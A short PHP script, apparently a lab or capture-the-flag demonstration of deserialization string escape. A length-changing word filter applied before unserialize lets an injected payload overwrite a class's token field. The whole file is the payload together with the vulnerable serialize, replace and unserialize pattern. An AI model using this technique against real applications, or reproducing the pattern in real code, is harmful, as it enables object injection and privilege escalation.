<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
$a=new message("a","b",'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}";');
echo serialize($a);
$umsg = str_replace('fuck', 'loveU', serialize($a));
var_dump(unserialize($umsg));
